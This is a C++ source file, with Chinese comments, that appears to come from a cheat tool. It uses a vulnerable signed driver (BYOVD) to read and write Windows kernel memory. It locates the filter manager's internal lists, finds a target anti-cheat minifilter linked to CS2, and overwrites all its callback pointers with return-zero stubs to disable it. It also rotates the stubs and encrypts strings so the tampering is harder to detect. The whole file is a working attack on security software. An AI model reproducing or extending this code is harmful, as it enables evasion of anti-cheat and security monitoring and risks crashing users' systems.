    //   但 FLT_FILTER+0x100=FilterUnload, +0x108=InstanceSetup, ... 这些回调指针
    //   会被误认为 Operations. 真正的 Operations 在 +0x1a8 (Win10/11 x64 标准).
    //   修复: 优先尝试 +0x1a8, 用 MJ 验证 (MajorFunction <= 0x1B 或 == 0x80).
    //         失败时回退扫描 0x100-0x400, 但每个候选都做 MJ 验证.
    uint64_t opsAddr = 0;
    uint64_t matchedOpsOff = 0;

    // 辅助 lambda: 验证指针是否指向合法的 FLT_OPERATION_REGISTRATION 数组
    auto validateOpsArray = [&](uint64_t val) -> bool {
        if (val <= 0xFFFF800000000000ULL || val >= 0xFFFFFFFFFFFFFFFFULL) return false;
        // 读第一个条目的 MajorFunction (偏移 0) 和 PreOperation (偏移 8)
        uint8_t mj = 0;
        uint64_t preOp = 0;
        if (!kma.ReadKernelVA(val, &mj, 1)) return false;
        if (!kma.ReadKernelVA(val + 8, &preOp, 8)) return false;
        // MJ 必须是合法 IRP_MJ (0x00-0x1B) 或终结符 0x80
        if (mj > 0x1B && mj != 0x80) return false;
        // PreOperation 为 0 (无回调) 或内核地址
        if (preOp != 0 && preOp < 0xFFFF800000000000ULL) return false;
        return true;
    };

    // 1. 优先尝试标准偏移 +0x1a8 (Win10/11 x64)
    {
        uint64_t val = 0;
        if (kma.ReadKernelVA(filterAddr + 0x1a8, &val, sizeof(val)) && validateOpsArray(val)) {
            opsAddr = val;
            matchedOpsOff = 0x1a8;
            StateLog("FLT", "OpsAtStd", "off=0x1a8 ops=0x%llX", (unsigned long long)opsAddr);
        }
    }

    // 2. 回退: 扫描 0x100-0x400, 每个候选做 MJ 验证
    if (!opsAddr) {
        for (uint64_t off = 0x100; off <= 0x400; off += 8) {
            uint64_t val = 0;
            if (!kma.ReadKernelVA(filterAddr + off, &val, sizeof(val))) continue;
            if (!validateOpsArray(val)) continue;
            opsAddr = val;
            matchedOpsOff = off;
            StateLog("FLT", "OpsAtScan", "off=0x%llX ops=0x%llX",
                     (unsigned long long)off, (unsigned long long)opsAddr);
            break;
        }
    }

    if (!opsAddr) {
        StateLog("FLT", "OpsNotFound", "filter=0x%llX", (unsigned long long)filterAddr);
        ByovdDiag("FLT:NTRL: Operations pointer not found in FLT_FILTER\n");
        return false;
    }

    // 遍历 FLT_OPERATION_REGISTRATION 数组 (以 IRP_MJ_OPERATION_END=0x80 终结)
    int replaced = 0;
    int totalCallbacks = 0; // 非 NULL 回调总数
    int stubRotIdx = 0;  // ★ BUILD 555 P2-3: stub 轮询索引 (每个回调使用不同 stub)

    for (int i = 0; i < 64; i++) {  // 最多 64 个操作注册
        KernFltOpReg reg = {};
        uint64_t regAddr = opsAddr + (uint64_t)(i * sizeof(KernFltOpReg));
        if (!kma.ReadKernelVA(regAddr, &reg, sizeof(reg)))
            break;

        if (reg.MajorFunction == 0x80) break;  // IRP_MJ_OPERATION_END
        // ★ v3.296 FIX: 验证 MJ 范围 — 防止遍历超出 Operations 数组到相邻池内存
        //   FLT_OPERATION_REGISTRATION.MajorFunction 必须是 0x00-0x1B (IRP_MJ_*) 或 0x80 (终结符)
        //   超出范围说明已遍历到非 Operations 内存, 应停止
        if (reg.MajorFunction > 0x1B) {
            ByovdDiag("FLT:NTRL: [%d] MJ=0x%02X invalid (not IRP_MJ), stopping traversal\n",
                i, (unsigned)reg.MajorFunction);
            break;
        }

        // 统计非 NULL 回调
        if (reg.PreOperation)  totalCallbacks++;
        if (reg.PostOperation) totalCallbacks++;

        bool modified = false;

        // 替换 PreOp 回调
        if (reg.PreOperation != 0 && !isStubbedToAny(reg.PreOperation)) {
            uint64_t preOpAddr = regAddr + offsetof(KernFltOpReg, PreOperation);
            // ★ BUILD 555 P2-3: 轮询使用不同 stub (避免所有回调指向同一地址)
            uint64_t useStub = stubAddrs[stubRotIdx % stubCount];
            stubRotIdx++;
            if (kma.WriteKernelVA(preOpAddr, &useStub, sizeof(useStub))) {
                ByovdDiag("FLT:NTRL: [%d] MJ=0x%02X PreOp 0x%llX→stub%zu\n",
                    i, (unsigned)reg.MajorFunction,
                    (unsigned long long)reg.PreOperation,
                    (size_t)((stubRotIdx - 1) % stubCount));
                replaced++;
                modified = true;
            }
        } else if (reg.PreOperation != 0 && isStubbedToAny(reg.PreOperation)) {
            replaced++; // 已经是 stub, 计入成功
        }

        // 替换 PostOp 回调 (可能为 NULL, 跳过)
        if (reg.PostOperation != 0 && !isStubbedToAny(reg.PostOperation)) {
            uint64_t postOpAddr = regAddr + offsetof(KernFltOpReg, PostOperation);
            // ★ BUILD 555 P2-3: 轮询使用不同 stub
            uint64_t useStub = stubAddrs[stubRotIdx % stubCount];
            stubRotIdx++;
            if (kma.WriteKernelVA(postOpAddr, &useStub, sizeof(useStub))) {
                ByovdDiag("FLT:NTRL: [%d] MJ=0x%02X PostOp 0x%llX→stub%zu\n",
                    i, (unsigned)reg.MajorFunction,
                    (unsigned long long)reg.PostOperation,
                    (size_t)((stubRotIdx - 1) % stubCount));
                replaced++;
                modified = true;
            }
        } else if (reg.PostOperation != 0 && isStubbedToAny(reg.PostOperation)) {
            replaced++; // 已经是 stub, 计入成功
        }

        // 不修改 Flags (保留 FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO 等标志)
    }

    // ★ v3.126n-review: 修复部分成功误报 — 只有全部回调都被 stub 替换才算成功
    // ★ v3.296 FIX: totalCallbacks==0 时不应误报成功 (PAC minifilter 必有回调)
    //   原代码: replaced(0) >= totalCallbacks(0) → true, 误报中和成功
    //   修复: totalCallbacks==0 时返回 false (Operations 数组为空或无效)
    bool allReplaced = (totalCallbacks > 0 && replaced >= totalCallbacks);
    StateLog("FLT", "NtrlCallbacks", "replaced=%d total=%d ok=%d",
             replaced, totalCallbacks, allReplaced ? 1 : 0);
    ByovdDiag("FLT:NTRL: replaced %d/%d callback pointers → %s\n",
        replaced, totalCallbacks, allReplaced ? "ALL OK" : "PARTIAL FAIL");
    return allReplaced;
}

// === Public API ===

bool MinifilterNeutralizer::NeutralizeMessageTransfer() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        StateLog("FLT", "NtrlSkip", "byovd inactive");
        ByovdDiag("FLT:NTRL: Neutralize skipped — BYOVD not active\n");
        return false;
    }
    // ★ v3.296 FIX-18: CS2 退出后不遍历 FilterList — 防止蓝屏
    //   CS2 关闭时 PAC minifilter 被卸载, FLT_FILTER 结构释放,
    //   遍历 FilterList 会访问已释放的池内存 → BSOD 0x50.
    if (g_cs2Exited) {
        StateLog("FLT", "NtrlSkip", "cs2 exited");
        return false;
    }

    StateLog("FLT", "NtrlStart", "");
    ByovdDiag("B550:NT:=== ntrl mtf (keep) ===\n");  // ★ BUILD 550: 脱敏 (原含过滤器名)

    uint64_t fltmgrBase = 0;
    {
        char fltName[16];
        STEALTH_STR_DECRYPT_TO("fltmgr.sys", fltName, sizeof(fltName));
        fltmgrBase = kma.GetKernelModuleBase(fltName);
        SecureZeroMemory(fltName, sizeof(fltName));
    }
    if (!fltmgrBase) {
        StateLog("FLT", "NtrlFail", "step=fltmgr not loaded");
        ByovdDiag("FLT:NTRL: flt not loaded\n");
        return false;
    }
    StateLog("FLT", "NtrlStep", "step=fltmgr ok=0x%llX", (unsigned long long)fltmgrBase);

    // 1. 定位 FltGlobals
    uint64_t fltGlobals = FindFltGlobals(fltmgrBase);
    if (!fltGlobals) {
        StateLog("FLT", "NtrlFail", "step=FltGlobals not found");
        return false;
    }
    StateLog("FLT", "NtrlStep", "step=FltGlobals ok=0x%llX", (unsigned long long)fltGlobals);

    // 2. 查找 tgt minifilter
    uint64_t filterAddr = 0;
    {
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        filterAddr = FindFilterByName(fltmgrBase, fltGlobals, pacNameW);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
    }
    if (!filterAddr) {
        // ★ v3.296: FindFilterByName 失败 → 尝试 FindFilterByStringScan
        wchar_t pacNameW2[256] = {};
        FillPacTargetName(pacNameW2, 256);
        filterAddr = FindFilterByStringScan(fltmgrBase, fltGlobals, pacNameW2);
        SecureZeroMemory(pacNameW2, sizeof(pacNameW2));
        if (filterAddr) {
            StateLog("FLT", "NtrlStep", "step=StrScan ok=0x%llX", (unsigned long long)filterAddr);
        }
    }
    if (!filterAddr) {
        // ★ v3.126p: 精确匹配失败 → 尝试内核模糊扫描
        wchar_t kernName[256] = {};
        filterAddr = FindPacFilterInKernel(fltmgrBase, fltGlobals, kernName, 256);
        SecureZeroMemory(kernName, sizeof(kernName));
        if (filterAddr) {
            StateLog("FLT", "NtrlStep", "step=KernScan ok=0x%llX", (unsigned long long)filterAddr);
        }
    }
    if (!filterAddr) {
        StateLog("FLT", "NtrlFail", "step=filter not found");
        ByovdDiag("FLT:NTRL: no tgt-filter found in kernel\n");
        return false;
    }
    StateLog("FLT", "NtrlStep", "step=filter ok=0x%llX", (unsigned long long)filterAddr);

    // 3. 中和回调
    if (!NeutralizeCallbacks(filterAddr)) {
        StateLog("FLT", "NtrlFail", "step=NeutralizeCallbacks");
        return false;
    }

    StateLog("FLT", "NtrlOK", "filter=0x%llX", (unsigned long long)filterAddr);
    ByovdDiag("FLT:NTRL: === NEUTRALIZED SUCCESSFULLY ===\n");
    return true;
}

// ============================================================
// ★ BUILD 475: VerifyFltPipeline — 管道完整性验证
//
// 目标: 在不依赖 MessageTransfer.sys 的情况下, 100% 验证 FLT 管道可用性
//
// 验证步骤:
//   1. 找到 FltGlobals (sigscan + .data section scan fallback)
//   2. 找到 FrameList → FilterList (枚举链表头)
//   3. 遍历 FilterList, 枚举至少一个 FLT_FILTER 并读取其名称
//   4. 找到 ret0 stub 地址
//
// 如果以上全部通过, 则证明:
//   当 MessageTransfer.sys 被加载时, NeutralizeMessageTransfer() 必定能:
//     a) 在 FilterList 中找到它
//     b) 读取其 Operations 指针
//     c) 将所有回调替换为 ret0 stub
//
// 验证结果:
//   TRUE  = 管道完整, tgt minifilter 中和 100% 可行 (只要驱动加载)
//   FALSE = 管道有缺陷, 需要修复 (查看详细诊断日志)
// ============================================================
bool MinifilterNeutralizer::VerifyFltPipeline() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("FLT:VERIFY: SKIP — BYOVD not active\n");
        return false;
    }

    ByovdDiag("FLT:VERIFY: ========================================\n");
    ByovdDiag("FLT:VERIFY: PIPELINE INTEGRITY CHECK (BUILD 475)\n");
    ByovdDiag("FLT:VERIFY: ========================================\n");

    int checksPassed = 0;
    int checksTotal = 4;

    // === Check 1: fltmgr.sys loaded ===
    ByovdDiag("FLT:VERIFY: [1/%d] Checking flt...\n", checksTotal);
    uint64_t fltmgrBase = 0;
    {
        char fltName[16];
        STEALTH_STR_DECRYPT_TO("fltmgr.sys", fltName, sizeof(fltName));
        fltmgrBase = kma.GetKernelModuleBase(fltName);
        SecureZeroMemory(fltName, sizeof(fltName));
    }
    if (!fltmgrBase) {
        ByovdDiag("FLT:VERIFY: FAIL — flt not loaded\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (0/%d checks)\n", checksTotal);
        return false;
    }
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — flt at 0x%llX\n", (unsigned long long)fltmgrBase);

    // === Check 2: FltGlobals found ===
    ByovdDiag("FLT:VERIFY: [2/%d] Finding FltGlobals...\n", checksTotal);
    uint64_t fltGlobals = FindFltGlobals(fltmgrBase);
    if (!fltGlobals) {
        ByovdDiag("FLT:VERIFY: FAIL — FltGlobals not found (both sigscan and .data scan failed)\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (%d/%d checks)\n", checksPassed, checksTotal);
        return false;
    }
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — FltGlobals at 0x%llX\n", (unsigned long long)fltGlobals);

    // === Check 3: 通过 FltGlobals 查找 FilterList 并枚举过滤器 ===
    // ★ BUILD 483: BUILD 482 的 .data pool pointer 全量扫描产生海量 IOCTL 导致蓝屏.
    //   改为: 优先使用已找到的 fltGlobals (与 FindFilterByName 同路径),
    //   该路径 IOCTL 读取极少 (<200 次). 仅当 FltGlobals 路径失败时,
    //   才启用量极小的 pool scan 作为后备.
    ByovdDiag("FLT:VERIFY: [3/%d] Finding FilterList via FltGlobals (BUILD 483)...\n", checksTotal);

    uint64_t bestListHead = 0;
    int bestFilterCount = 0;
    int bestQi = -1;
    uint64_t bestFilterListOff = 0;

    // ============================================================
    // FAST PATH: 使用 fltGlobals 的前 8 qword 寻找 FrameList → FilterList
    // ============================================================
    uint64_t globQw[8] = {};
    for (int i = 0; i < 8; i++) {
        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
    }
    ByovdDiag("FLT:VERIFY: FltGlobals hex: %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX\n",
        (unsigned long long)globQw[0], (unsigned long long)globQw[1],
        (unsigned long long)globQw[2], (unsigned long long)globQw[3],
        (unsigned long long)globQw[4], (unsigned long long)globQw[5],
        (unsigned long long)globQw[6], (unsigned long long)globQw[7]);

    {
        // FilterList 偏移 (与 FindFilterByName 一致)
        // ★ v3.296: 新增 0x080-0x180 范围 (Win11 24H2 RegisteredFilters.rList@+0x0a0)
        static const uint64_t filterOffs[] = {
            0x080,0x088,0x090,0x098,0x0a0,0x0a8,0x0b0,0x0b8,
            0x0c0,0x0c8,0x0d0,0x0d8,0x0e0,0x0e8,0x0f0,0x0f8,
            0x100,0x108,0x110,0x118,0x120,0x128,0x130,0x138,
            0x140,0x148,0x150,0x158,0x160,0x168,0x170,0x178,0x180,
            0x188,0x190,0x198,0x1A0,0x1A8,0x1B0,0x1B8,0x1C0,0x1C8,0x1D0,
            0x1D8,0x1E0,0x1E8,0x1F0,0x1F8,0x200,0x208,0x210,0x218,0x220,
            0x228,0x230,0x238,0x240,0x248,0x250,0x258,0x260,0x268,0x270,
            0x278,0x280,0x288,0x290,0x298,0x2A0,0x2A8,0x2B0,0x2B8,0x2C0,
            0x2C8,0x2D0,0x2D8,0x2E0,0x2E8,0x2F0,0x2F8,0x300,
        };
        static const int fOffCount = sizeof(filterOffs) / sizeof(filterOffs[0]);

        // Name 偏移 (与 FindFilterByName 一致: 0x00..0x400)
        static const uint64_t nameOffs[] = {
            0x000, 0x008, 0x010, 0x018, 0x020, 0x028, 0x030,
            0x038, 0x040, 0x048, 0x058, 0x068, 0x078,
            0x088, 0x098, 0x0A8, 0x0B8, 0x0C8, 0x0D8,
            0x0E8, 0x0F8, 0x108, 0x118, 0x128, 0x138,
            0x148, 0x158, 0x168, 0x178, 0x188, 0x198,
            0x1A8, 0x1B8, 0x1C8, 0x1D8, 0x1E8, 0x1F8,
            0x208, 0x218, 0x228, 0x238, 0x248, 0x258,
            0x268, 0x278, 0x288, 0x298, 0x2A8, 0x2B8,
            0x2C8, 0x2D8, 0x2E8, 0x2F8, 0x300,
            0x308, 0x318, 0x328, 0x338, 0x348, 0x358,
            0x368, 0x378, 0x388, 0x398, 0x3A8, 0x3B8,
            0x3C8, 0x3D8, 0x3E8, 0x3F8, 0x400,
        };
        static const int nOffCount = sizeof(nameOffs) / sizeof(nameOffs[0]);

        for (int qi = 0; qi < 8; qi++) {
            uint64_t frame = globQw[qi];
            if (frame < 0xFFFF800000000000ULL) continue;

            uint64_t firstQw = 0;
            if (!kma.ReadKernelVA(frame, &firstQw, 8)) continue;
            if (firstQw < 0xFFFF800000000000ULL) {
                ByovdDiag("FLT:VERIFY: globQw[%d]=%016llX rejected (data not kernel ptr)\n",
                    qi, (unsigned long long)frame);
                continue;
            }

            ByovdDiag("FLT:VERIFY: try globQw[%d]=%016llX as FrameList...\n",
                qi, (unsigned long long)frame);

            for (int fi = 0; fi < fOffCount; fi++) {
                uint64_t head = frame + filterOffs[fi];
                uint64_t flink = 0, blink = 0;
                if (!kma.ReadKernelVA(head, &flink, 8)) continue;
                if (!kma.ReadKernelVA(head + 8, &blink, 8)) continue;
                if (flink == head) continue; // 空链表
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

                // ★ 找到活 FilterList → 枚举过滤器
                uint64_t cur = flink;
                int foundNamed = 0;

                for (int iter = 0; iter < 100 && cur && cur != head; iter++) {
                    uint64_t fBase = cur - 0x008; // ActiveLink 在 +0x008

                    for (int ni = 0; ni < nOffCount; ni++) {
                        uint16_t nl = 0; uint64_t nb = 0;
                        uint64_t uniAddr = fBase + nameOffs[ni];
                        if (kma.ReadKernelVA(uniAddr, &nl, sizeof(nl)) &&
                            kma.ReadKernelVA(uniAddr + 8, &nb, sizeof(nb))) {
                            if (nl > 0 && nl <= 256 && nl % 2 == 0 &&
                                nb >= 0xFFFF800000000000ULL && nb < 0xFFFFFD0000000000ULL) {
                                // ★ BUILD 500: 固定数组替代 std::wstring — 避免 CRT 堆依赖
                                wchar_t fn[256] = {};
                                int fnChars = ReadKernelUnicodeString(nb, nl, fn, 256);
                                if (fnChars > 0) {
                                    foundNamed++;
                                    if (foundNamed == 1) {
                                        ByovdDiag("FLT:VERIFY: found '%ls' via globQw[%d]+0x%llX (nameOff=0x%llX)\n",
                                            fn, qi, filterOffs[fi], nameOffs[ni]);
                                    }
                                }
                            }
                        }
                        if (foundNamed > 0) goto NEXT_ENTRY_GLOB; // 找到 name 即可, 跳至下一个链表节点
                    }
                    NEXT_ENTRY_GLOB:
                    if (cur >= 0xFFFFFD0000000000ULL) break;  // ★ v3.296 FIX-18: 白名单验证
                    if (!kma.ReadKernelVA(cur, &cur, 8)) break;
                }

                if (foundNamed > 0) {
                    ByovdDiag("FLT:VERIFY: globQw[%d]+0x%llX: %d named filters\n",
                        qi, filterOffs[fi], foundNamed);
                    if (foundNamed > bestFilterCount) {
                        bestFilterCount = foundNamed;
                        bestListHead = head;
                        bestQi = qi;
                        bestFilterListOff = filterOffs[fi];
                    }
                }
            }

            if (bestFilterCount > 0) {
                ByovdDiag("FLT:VERIFY: FAST PATH SUCCESS — %d named filters via FltGlobals\n",
                    bestFilterCount);
                goto check3_done;
            }
        }
    }

    // ============================================================
    // ★ BUILD 495: 禁用 pool scan — PDFWKRNL IOCTL 0x80002014 无边界检查,
    //   解引用 .data 段中的野指针会直接触发内核页错误 → 蓝屏.
    //   FltGlobals 已找到 (Check 2 PASS), 但 FrameList 无法从 FltGlobals 解析,
    //   说明 Win11 24H2 FLT_FRAME 布局与已知模式不匹配.
    //   在找到安全的 Win11 FrameList 解析方法前, 不执行 pool scan.
    // ============================================================
    ByovdDiag("FLT:VERIFY: FltGlobals found but FrameList path failed — Win11 layout mismatch (BUILD 495)\n");
    ByovdDiag("B550:VR:pool-scan disabled (bsod risk)\n");  // ★ BUILD 550: 脱敏 (原含驱动名)

    // ★ BUILD 504: 详细内存转储 — 逆向 Win11 FLT_FRAME/FLT_GLOBALS 结构
    //   读取 fltGlobals 周围 0x200 字节进行结构分析
    {
        ByovdDiag("FLT:VERIFY: === BUILD 504 structural dump of FltGlobals at 0x%llX ===\n",
            (unsigned long long)fltGlobals);
        uint8_t dumpBuf[0x200] = {};
        if (kma.ReadKernelVA(fltGlobals, dumpBuf, sizeof(dumpBuf))) {
            for (int row = 0; row < 0x200; row += 32) {
                ByovdDiag("FLT:VERIFY: +0x%03X: %016llX %016llX %016llX %016llX\n",
                    row,
                    (unsigned long long)*(uint64_t*)(dumpBuf + row),
                    (unsigned long long)*(uint64_t*)(dumpBuf + row + 8),
                    (unsigned long long)*(uint64_t*)(dumpBuf + row + 16),
                    (unsigned long long)*(uint64_t*)(dumpBuf + row + 24));
            }
        }
        // ★ 也 dump 候选 LIST_ENTRY 地址的内容
        for (int qi = 0; qi < 8; qi++) {
            uint64_t cand = globQw[qi];
            if (cand < 0xFFFF800000000000ULL) continue;
            if (cand == fltGlobals) continue; // 跳过自身引用
            uint8_t cd[64] = {};
            if (kma.ReadKernelVA(cand, cd, 64)) {
                ByovdDiag("FLT:VERIFY: globQw[%d]=0x%llX: %016llX %016llX %016llX %016llX\n",
                    qi, (unsigned long long)cand,
                    (unsigned long long)*(uint64_t*)(cd),
                    (unsigned long long)*(uint64_t*)(cd + 8),
                    (unsigned long long)*(uint64_t*)(cd + 16),
                    (unsigned long long)*(uint64_t*)(cd + 24));
            }
        }
    }

    // ★ BUILD 504: 尝试将 fltGlobals 自身作为 FLT_FRAME (Win11 可能直接内嵌)
    //   检查 +0x00 和 +0x18 处的 LIST_ENTRY 是否包含有效 FLT_FILTER
    {
        ByovdDiag("FLT:VERIFY: BUILD 504: trying fltGlobals as direct FLT_FRAME...\n");
        // 尝试 +0x18 作为 FilterList (Win11 常见偏移)
        uint64_t directOffs[] = { 0x18, 0x00, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70 };
        for (uint64_t doff : directOffs) {
            uint64_t head = fltGlobals + doff;
            uint64_t flink = 0, blink = 0;
            if (!kma.ReadKernelVA(head, &flink, 8)) continue;
            if (!kma.ReadKernelVA(head + 8, &blink, 8)) continue;
            if (flink == head) {
                ByovdDiag("FLT:VERIFY: +0x%llX: empty LIST_ENTRY (self-ref)\n", doff);
                continue;
            }
            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

            // 尝试遍历这个链表, 看是否是 FilterList
            uint64_t cur = flink;
            int namedFound = 0;
            for (int iter = 0; iter < 100 && cur && cur != head; iter++) {
                uint64_t fBase = cur - 0x008; // ActiveLink at +0x008
                // 尝试读取 Name (UNICODE_STRING at various offsets)
                for (uint64_t no = 0x38; no <= 0x300; no += 8) {
                    uint16_t nl = 0; uint64_t nb = 0;
                    if (kma.ReadKernelVA(fBase + no, &nl, sizeof(nl)) &&
                        kma.ReadKernelVA(fBase + no + 8, &nb, sizeof(nb))) {
                        if (nl > 0 && nl <= 256 && nl % 2 == 0 &&
                            nb >= 0xFFFF800000000000ULL && nb < 0xFFFFFD0000000000ULL) {
                            wchar_t fn[256] = {};
                            int fnChars = ReadKernelUnicodeString(nb, nl, fn, 256);
                            if (fnChars > 0) {
                                namedFound++;
                                if (namedFound == 1) {
                                    ByovdDiag("FLT:VERIFY: +0x%llX enum: '%ls' at fBase=0x%llX (nameOff=0x%llX)\n",
                                        doff, fn, (unsigned long long)fBase, no);
                                }
                                goto NEXT_DIRECT;
                            }
                        }
                    }
                }
                NEXT_DIRECT:
                if (cur >= 0xFFFFFD0000000000ULL) break;  // ★ v3.296 FIX-18: 白名单验证
                if (!kma.ReadKernelVA(cur, &cur, 8)) break;
            }
            if (namedFound > 0) {
                ByovdDiag("FLT:VERIFY: BUILD 504: +0x%llX → %d named filters FOUND!\n", doff, namedFound);
                if (namedFound > bestFilterCount) {
                    bestFilterCount = namedFound;
                    bestListHead = head;
                    bestQi = -2;
                    bestFilterListOff = doff;
                }
            }
        }
        if (bestFilterCount > 0) {
            ByovdDiag("FLT:VERIFY: BUILD 504 direct FLT_FRAME SUCCESS — %d named filters\n", bestFilterCount);
            goto check3_done;
        }
    }

    // ★ BUILD 505: 探索 FltGlobals 中的非 fltmgr 内核指针
    //   Win11 的 FilterList 可能存储在池分配中, 通过 FltGlobals 的指针引用
    {
        ByovdDiag("FLT:VERIFY: BUILD 505: exploring non-flt pointers in FltGlobals...\n");
        // 读取整个 FltGlobals 结构 (0x200 字节), 提取所有内核指针
        uint8_t fgBuf[0x200] = {};
        if (kma.ReadKernelVA(fltGlobals, fgBuf, sizeof(fgBuf))) {
            // 收集所有非 fltmgr 的内核指针
            struct ExtPtr { uint64_t offset; uint64_t value; };
            ExtPtr extPtrs[64] = {};
            int extCount = 0;

            for (int off = 0; off < (int)sizeof(fgBuf) - 7; off += 8) {
                uint64_t val = *(uint64_t*)(fgBuf + off);
                // ★ BUILD 515: 包含所有内核指针 (包括 fltmgr 范围内的)
                if (val >= 0xFFFF800000000000ULL && val < 0xFFFFFFFFFFFFFFFFULL) {
                    if (extCount < 64) {
                        extPtrs[extCount].offset = off;
                        extPtrs[extCount].value = val;
                        extCount++;
                    }
                }
            }

            ByovdDiag("FLT:VERIFY: BUILD 515: found %d kernel pointers (incl. flt range)\n", extCount);
            // ★ BUILD 510: 探索所有外部指针, 选择命名条目最多的作为 FilterList
            //   BUILD 505 在找到第一个有效列表后就停止, 导致 +0xF8 假阳性被选中
            int bestNamedCount = 0;
            uint64_t bestExtPtr = 0;
            uint64_t bestExtOff = 0;
            int bestTotalCount = 0;

            for (int pi = 0; pi < extCount; pi++) {
                uint64_t ptr = extPtrs[pi].value;
                ByovdDiag("FLT:VERIFY: BUILD 510: exploring +0x%llX → 0x%llX...\n",
                    extPtrs[pi].offset, (unsigned long long)ptr);

                // 读取该指针指向的内存, 看是否是 LIST_ENTRY
                uint8_t pd[128] = {};
                if (!kma.ReadKernelVA(ptr, pd, sizeof(pd))) continue;

                uint64_t flink = *(uint64_t*)(pd);
                uint64_t blink = *(uint64_t*)(pd + 8);
                ByovdDiag("FLT:VERIFY:   [0]=%016llX [8]=%016llX\n",
                    (unsigned long long)flink, (unsigned long long)blink);

                // 检查是否是 LIST_ENTRY 头
                if (flink == ptr) {
                    ByovdDiag("FLT:VERIFY:   → self-ref LIST_ENTRY (empty)\n");
                    continue;
                }
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

                // 尝试遍历这个链表
                uint64_t cur = flink;
                int namedFound = 0;
                int totalEntries = 0;
                for (int iter = 0; iter < 100 && cur && cur != ptr; iter++) {
                    totalEntries++;
                    uint64_t fBase = cur - 0x008; // ActiveLink at +0x008
                    for (uint64_t no = 0x00; no <= 0x400; no += 8) {
                        uint16_t nl = 0; uint64_t nb = 0;
                        if (kma.ReadKernelVA(fBase + no, &nl, sizeof(nl)) &&
                            kma.ReadKernelVA(fBase + no + 8, &nb, sizeof(nb))) {
                            if (nl > 0 && nl <= 256 && nl % 2 == 0 &&
                                nb >= 0xFFFF800000000000ULL && nb < 0xFFFFFD0000000000ULL) {
                                wchar_t fn[256] = {};
                                int fnChars = ReadKernelUnicodeString(nb, nl, fn, 256);
                                if (fnChars > 0) {
                                    namedFound++;
                                    if (namedFound == 1) {
                                        ByovdDiag("FLT:VERIFY:   → '%ls' at fBase=0x%llX (nameOff=0x%llX)\n",
                                            fn, (unsigned long long)fBase, no);
                                    }
                                    goto NEXT_EXT_510;
                                }
                            }
                        }
                    }
                    NEXT_EXT_510:
                    if (cur >= 0xFFFFFD0000000000ULL) break;  // ★ v3.296 FIX-18: 白名单验证
                    if (!kma.ReadKernelVA(cur, &cur, 8)) break;
                }
                ByovdDiag("FLT:VERIFY: BUILD 510: +0x%llX → 0x%llX: %d named + %d total entries\n",
                    extPtrs[pi].offset, (unsigned long long)ptr, namedFound, totalEntries);

                if (namedFound > bestNamedCount) {
                    bestNamedCount = namedFound;
                    bestExtPtr = ptr;
                    bestExtOff = extPtrs[pi].offset;
                    bestTotalCount = totalEntries;
                }
            }

            if (bestNamedCount > 0) {
                bestFilterCount = bestNamedCount;
                bestListHead = bestExtPtr;
                bestQi = -3;
                bestFilterListOff = bestExtOff;
                ByovdDiag("FLT:VERIFY: BUILD 510: BEST FilterList at +0x%llX → 0x%llX (%d named + %d total)\n",
                    bestExtOff, (unsigned long long)bestExtPtr, bestNamedCount, bestTotalCount);
                goto check3_done;
            }
        }
        ByovdDiag("FLT:VERIFY: BUILD 505: external pointer exploration complete\n");
    }

    // ★ BUILD 502: FrameList 失败 → 尝试字符串扫描 fallback
    if (bestFilterCount == 0) {
        ByovdDiag("FLT:VERIFY: trying BUILD 502 string scan for system minifilters...\n");
        // 尝试扫描常见系统 minifilter 名称来验证管道
        const wchar_t* testFilters[] = { L"FileInfo", L"WdFilter", L"Wof", L"luafv", nullptr };
        for (int ti = 0; testFilters[ti]; ti++) {
            uint64_t filterAddr = FindFilterByStringScan(fltmgrBase, fltGlobals, testFilters[ti]);
            if (filterAddr) {
                ByovdDiag("FLT:VERIFY: BUILD 502 found '%ls' → FLT pipeline VERIFIED\n", testFilters[ti]);
                bestFilterCount = 1;
                bestListHead = filterAddr + 0x008; // ActiveLink
                bestQi = -1;
                bestFilterListOff = 0;
                goto check3_done;
            }
        }
        ByovdDiag("FLT:VERIFY: FAIL — no FILTER_LIST with named minifilters found\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (%d/%d checks)\n", checksPassed, checksTotal);
        return false;
    }

    check3_done:
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — FilterList via globQw[%d]+0x%llX (%d named filters)\n",
        bestQi, bestFilterListOff, bestFilterCount);

    // === Check 4: ret0 stub found ===
    ByovdDiag("FLT:VERIFY: [4/%d] Finding ret0 stub in flt...\n", checksTotal);
    uint64_t stubAddr = FindRet0Stub(fltmgrBase, 0x400000);
    if (!stubAddr) {
        ByovdDiag("FLT:VERIFY: FAIL — ret0 stub not found\n");
        ByovdDiag("FLT:VERIFY: RESULT: FAIL (%d/%d checks)\n", checksPassed, checksTotal);
        return false;
    }
    checksPassed++;
    ByovdDiag("FLT:VERIFY: PASS — ret0 stub at flt+0x%llX\n",
        (unsigned long long)(stubAddr - fltmgrBase));

    // === FINAL VERDICT ===
    ByovdDiag("FLT:VERIFY: ========================================\n");
    ByovdDiag("FLT:VERIFY: RESULT: PASS (%d/%d checks)\n", checksPassed, checksTotal);
    ByovdDiag("FLT:VERIFY: === PIPELINE VERIFIED ===\n");
    ByovdDiag("FLT:VERIFY: | FltGlobals → FrameList → FilterList (%d filters) → ret0 stub |\n", bestFilterCount);
    ByovdDiag("FLT:VERIFY: | ⚠ UNTESTED — install tgt to verify neutralization works |\n");
    ByovdDiag("FLT:VERIFY: ========================================\n");

    return true;
}

bool MinifilterNeutralizer::IsMessageTransferNeutralized() {
